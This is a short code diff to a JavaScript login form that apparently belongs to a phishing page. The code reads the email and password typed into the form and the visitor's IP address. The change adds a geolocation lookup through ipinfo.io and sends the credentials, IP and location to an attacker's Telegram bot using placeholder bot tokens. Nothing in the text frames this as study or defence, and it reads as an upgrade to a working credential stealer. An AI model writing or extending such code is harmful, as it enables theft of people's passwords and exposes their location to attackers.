@@ -115,14 +115,18 @@
                 return;
             }
 
-            // Fetch the user's IP address
+            // Fetch the user's IP address and location
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
 
+                const locationResponse = await fetch(`https://ipinfo.io/${userIP}/json?token=YOUR_IPINFO_TOKEN`); // Replace with your IPinfo token
+                const locationData = await locationResponse.json();
+                const { city, region, country } = locationData;
+
                 // Prepare the message to send to Telegram
-                const message = `Email: ${email.value}\nPassword: ${password.value}\nIP: ${userIP}`;
+                const message = `Email: ${email.value}\nPassword: ${password.value}\nLocation: ${city}, ${region}, ${country}\nIP: ${userIP}`;
                 const telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
                 const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
                 const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
